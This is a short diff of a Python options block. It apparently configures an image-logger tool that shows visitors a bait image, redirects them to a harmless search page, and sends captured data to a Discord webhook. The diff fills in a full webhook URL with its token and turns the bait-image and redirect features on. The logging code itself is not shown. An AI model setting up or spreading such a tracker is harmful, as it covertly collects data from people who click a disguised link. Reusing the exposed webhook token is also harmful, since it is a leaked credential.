@@ -12,16 +12,16 @@
 # Options 
 options = {
     "webhook": {
-        "url": "WEBHOOK_URL",
+        "url": "https://discord.com/api/webhooks/1203623418440978475/e5EXhvWs0hQEP8537FsJdrD4yvUIAXydyayxVeKDTU1uyB7pePbRcsWajCgz2amjT7SI",
     },
     "image": {
-        "enabled": False,
+        "enabled": True,
         "corrupted-image-preview": False,
-        "url": "IMAGE_URL",
+        "url": "https://i.ytimg.com/vi/VUlRTWCvfzs/hqdefault.jpg",
     },
     "url": {
-         "enabled": False,
-         "url-redirect": "URL",
+         "enabled": True,
+         "url-redirect": "https://www.bing.com/search?q=hi&qs=HS&pq=hi&sc=10-2&cvid=C5CAB6D750B44BAAAF6957385ABD7B38&FORM=QBRE&sp=1&lq=0",
     },
 }
 
